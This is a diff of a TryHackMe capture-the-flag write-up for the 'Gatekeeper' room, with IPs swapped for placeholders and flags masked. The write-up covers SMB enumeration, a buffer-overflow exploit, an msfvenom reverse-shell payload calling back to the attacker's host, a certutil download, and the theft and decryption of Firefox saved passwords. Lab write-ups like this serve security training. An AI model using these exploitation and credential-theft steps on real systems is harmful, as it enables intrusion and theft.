@@ -2,17 +2,25 @@
 title: "Gatekeeper"
 ---
 
-This is a write-up for the [Gatekeeper Room](https://tryhackme.com/room/gatekeeper) on TryHackMe. S/o to SnoOw, Kafka and Noodles for the assist on this box.
+:::info Description
+
+These are my notes for the [Gatekeeper Room](https://tryhackme.com/room/gatekeeper) on TryHackMe.
+
+Credits: S/o to SnoOw, Kafka and Noodles for the assist on this box.
+
+|OS|Level|Rating
+|:---:|:-----:|:-----:|
+|Windows|Medium|4/5|
+
+:::
 
 ## RECON
 
-Let's enumerate all the things and see what the box can tell us.
+### Scan
 
-### Nmap
+Initial recon with an nmap scan: `nmap -v -sV -Pn -p-54000 -o nmap-gatekeeper.txt $TARGET_IP`
 
-Start with nmap: `nmap -v -sV -Pn -p-54000 -o nmap-gatekeeper.txt 10.10.51.255`
-
-```sh
+```bash
 # Nmap 7.92 scan initiated Tue Mar  1 20:43:11 2022 as: nmap -v -sV -Pn -p-54000 -o nmap-gatekeeper.txt 10.10.51.255
 Increasing send delay for 10.10.51.255 from 0 to 5 due to 11 out of 31 dropped probes since last increase.
 Increasing send delay for 10.10.51.255 from 80 to 160 due to 11 out of 12 dropped probes since last increase.
@@ -56,11 +64,11 @@ Service detection performed. Please report any incorrect results at https://nmap
 # Nmap done at Tue Mar  1 21:49:31 2022 -- 1 IP address (1 host up) scanned in 3980.16 seconds
 ```
 
-### Smbclient
+### Enumerate
 
-I can see the 135, 139 ports are open so let's try `smbclient`:
+I can see the 135, 139 ports are open so let's try `smbclient`: `smbclient -L //$TARGET_IP`
 
-```sh
+```bash
 smbclient -L //10.10.51.255
 Enter WORKGROUP\kali's password: 
 
@@ -75,11 +83,9 @@ do_connect: Connection to 10.10.51.255 failed (Error NT_STATUS_RESOURCE_NAME_NOT
 Unable to connect with SMB1 -- no workgroup available
 ```
 
-### Nmblookup
+now try `nmblookup`: `nmblookup -A $TARGET_IP`
 
-try `nmblookup`:
-
-```sh
+```bash
 nmblookup -A 10.10.51.255
 Looking up status of 10.10.51.255
         GATEKEEPER      <00> -         B <ACTIVE> 
@@ -92,9 +98,9 @@ Looking up status of 10.10.51.255
         MAC Address = 02-FD-26-02-B7-53
 ```
 
-try nmap with smb-enumeration-shares script scanning:
+try nmap with smb-enumeration-shares script scanning: `nmap --script smb-enum-shares -p 139,445 $TARGET_IP`
 
-```sh
+```bash
 nmap --script smb-enum-shares -p 139,445 10.10.51.255
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-01 20:20 NZDT
 Nmap scan report for 10.10.51.255
@@ -131,9 +137,9 @@ Host script results:
 Nmap done: 1 IP address (1 host up) scanned in 52.79 seconds
 ```
 
-try nmap with smb-vuln scanning:
+try nmap with smb-vuln scanning: `nmap --script smb-vuln* -p 139,445 $TARGET_IP`
 
-```sh
+```bash
 nmap --script smb-vuln* -p 139,445 10.10.51.255
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-01 20:23 NZDT
 Nmap scan report for 10.10.51.255
@@ -152,7 +158,7 @@ Nmap done: 1 IP address (1 host up) scanned in 11.47 seconds
 
 From nmap we can see this port open `31337` - let's try connecting to it:
 
-```sh
+```bash
 nc 10.10.51.255 31337                                                                                     130 ⨯
 
 Hello !!!
@@ -167,7 +173,7 @@ Looks like it takes user input, buffer overflow potential.
 
 Let's use smbclient to connect, maybe browse the shares that have read access:
 
-```sh
+```bash
 ┌──(kali㉿kali)-[~/…/RxHack/THM/OFFENSIVEPENTESTPATH/GATEKEEPER]
 └─$ smbclient //10.10.51.255/Users -U anonymous -W WORKGROUP
 Enter WORKGROUP\anonymous's password: 
@@ -208,7 +214,7 @@ Tip from noodles: do `offset.py` script with a big-ass number, use `pattern_crea
 
 Follow [Buffer Overflow Shortcut](/docs/hacker/bufferoverflow/resources) for the full technique.
 
-```sh
+```bash
 /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 6700 -q 39654138                       130 ⨯
 [*] Exact match at offset 146
 ```
@@ -250,7 +256,7 @@ except:
 
 Run it!
 
-```sh
+```bash
 ./eip.py   
 buffer= 150
 Crash Overwrite EIP: 42424242...
@@ -283,7 +289,7 @@ Find a module that doesn't have "Address Space Layout Randomization (ASLR)" memo
 
 `!mona jmp -r esp -cpb "\x00\x0a"`
 
-```sh
+```bash
 Log data, item 4
  Address=080414C3
  Message=  0x080414c3 : jmp esp |  {PAGE_EXECUTE_READ} [gatekeeper.exe] ASLR: False, Rebase: False, SafeSEH: True, OS: False, v-1.0- (C:\Users\IEUser\Downloads\gatekeeper.exe)
@@ -301,9 +307,9 @@ I choose `080414C3` = little endian = `\xc3\x14\x04\x08`
 
 Let's generate shellcode, minus the bad characters we've identified, with a reverse tcp shell, to connect back to a listener under our control.
 
-`msfvenom -p windows/shell_reverse_tcp LHOST=172.16.2.106 LPORT=80 EXITFUNC=thread -b "\x00\x0a" -f c`
+`msfvenom -p windows/shell_reverse_tcp LHOST=$LAN_IP LPORT=80 EXITFUNC=thread -b "\x00\x0a" -f c`
 
-- `LHOST` is our local interface
+- `LHOST` is our local interface e.g. eth0
 - we want port `80` to avoid detection
 - `-b` dont use these characters for the shellcode
 - `-f` format is C
@@ -366,7 +372,7 @@ except:
 
 you pop a shell and see the windows prompt!
 
-```sh
+```bash
 sudo rlwrap nc -lnvp 80                                                                                     1 ⨯
 listening on [any] 80 ...
 connect to [172.16.2.106] from (UNKNOWN) [172.16.2.125] 49360
@@ -382,7 +388,7 @@ Now that it works on the local box, we can try with some level of confidence, a 
 
 remember, change destination IP, and also LHOST in the msfvenom payload:
 
-`msfvenom -p windows/shell_reverse_tcp LHOST=10.11.55.83 LPORT=80 EXITFUNC=thread -b "\x00\x0a" -f c`
+`msfvenom -p windows/shell_reverse_tcp LHOST=$VPN_IP LPORT=80 EXITFUNC=thread -b "\x00\x0a" -f c`
 
 - `LHOST` is our VPN interface (i.e. `tun0`) so the THM box can see it
 - we want port `80` to avoid detection
@@ -394,7 +400,7 @@ remember, change destination IP, and also LHOST in the msfvenom payload:
 Once you pop a shell on the THM box, you can find the flag under the natbat user's Desktop folder:
 
 ```text
-{H4lf_W4y_Th3r3}
+{**************}
 
 The buffer overflow in this room is credited to Justin Steven and his 
 "dostackbufferoverflowgood" program.  Thank you!
@@ -413,7 +419,7 @@ per.exe`
 
 upload from the first reverse shell using certutil:
 
-`certutil -urlcache -split -f http://10.11.55.83/gatekeeper.exe gatekeeper.exe`
+`certutil -urlcache -split -f http://$VPN_IP/gatekeeper.exe gatekeeper.exe`
 
 didn't work- program ran as gatekeeper user, not admin.
 
@@ -421,7 +427,7 @@ didn't work- program ran as gatekeeper user, not admin.
 
 checking files for clues, see this `Firefox.lnk` file:
 
-```sh
+```bash
 type Desktop\Firefox.lnk
 LF  j7j7        DGYr?DUk0~tCFSF1P AppDatatY^Hg3(ߟgVAGkﾕPP*AppDataBL1P LocalﾕPP*TULocald1P MOZILL~1ﾕPP*sMozilla Firefox^2P5  firefox.exeﾕPP*sfirefox.exe-8_KԾ:C:\Users\'\\GATEKEEPER\Usersnatbat\AppData\Local\Mozilla Firefox\firefox.exe,..\AppData\Local\Mozilla Firefox\firefox.exe-C:\Users\natbat\AppData\Local\Mozilla Firefox
                                                                                             |IJHK`Xgatekeeperj 8   }'t1j 8  1SPSXFL8C&mm.S-1-5-21-663372427-3699997616-3390412905-1003b1SPSU(Ly9K-
@@ -433,7 +439,7 @@ Get to thinking "Firefox logins", google how to find firefox profiles and possib
 
 In our reverse shell:
 
-```sh
+```bash
 dir logins.json /s /p                                                                                               
 dir logins.json /s /p                                                                                               
  Volume in drive C has no label.                                                                                    
@@ -446,7 +452,7 @@ dir logins.json /s /p
 
 so we've found the profile folder, and the `logins.json` file:
 
-```sh
+```bash
 type logins.json
 {"nextId":2,"logins":[{"id":1,"hostname":"https://creds.com","httpRealm":null,"formSubmitURL":"","usernameField":"","passwordField":"","encryptedUsername":"MDIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECL2tyAh7wW+dBAh3qoYFOWUv1g==","encryptedPassword":"MEIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECIcug4ROmqhOBBgUMhyan8Y8Nia4wYvo6LUSNqu1z+OT8HA=","guid":"{7ccdc063-ebe9-47ed-8989-0133460b4941}","encType":1,"timeCreated":1587502931710,"timeLastUsed":1587502931710,"timePasswordChanged":1589510625802,"timesUsed":1}],"potentiallyVulnerablePasswords":[],"dismissedBreachAlertsByLoginGUID":{},"version":3}
 C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release>
@@ -468,13 +474,13 @@ Instead, the following method worked flawlessly.
 
 Start by copying the entire firefox user profile from the THM box to your local machine, by copying it on the THM to the open "Share"
 
-```sh
+```bash
 copy C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release` to `C:\Users\Share\profile
 ```
 
 Next, from my kali machine, use `smb //$gatekeeper-ip/Users` to log in (make sure to be in the dir you want the files downloaded to), then used these settings to download the files to your local machine:
 
-```sh
+```bash
 smbclient '\\server\share'
 mask ""
 recurse ON
@@ -489,7 +495,7 @@ Now on my local I have the THM box firefox profile files.
 
 I used this `git clone https://github.com/lclevy/firepwd.git` to decrypt the firefox profile (note: `Share/` is where I downloaded files from the THM box):
 
-```sh
+```bash
 python3 firepwd.py -d Share/                                                                                    
 globalSalt: b'2d45b7ac4e42209a23235ecf825c018e0382291d'                                                             
  SEQUENCE {                                                                                                         
@@ -542,17 +548,17 @@ password check? True
  }
 clearText b'86a15457f119f862f8296e4f2f6b97d9b6b6e9cb7a3204760808080808080808'
 decrypting login/password pairs
-   https://creds.com:b'mayor',b'8CL7O1N78MdrCIsV'
+   https://creds.com:b'mayor',b'8CL7O********IsV'
 ```
 
-So you can see a `login/password` combo of `mayor/8CL7O1N78MdrCIsV`.
+So you can see a `login/password` combo of `mayor/8CL7O********IsV`.
 
 I use this with xfreerdp to RDP into the box as a user who has Admin permissions i.e. `mayor`:
 
-`xfreerdp /u:mayor /p:8CL7O1N78MdrCIsV /v:10.10.236.23` 
+`xfreerdp /u:mayor /p:8CL7O********IsV /v:$TARGET_IP`
 
 login as mayor, who is in the admin group, and on their desktop is the `root.txt` flag:
 
 ### Flag: root.txt
 
-`{Th3_M4y0r_C0ngr4tul4t3s_U}`
+`{Th3_M4*******************}`
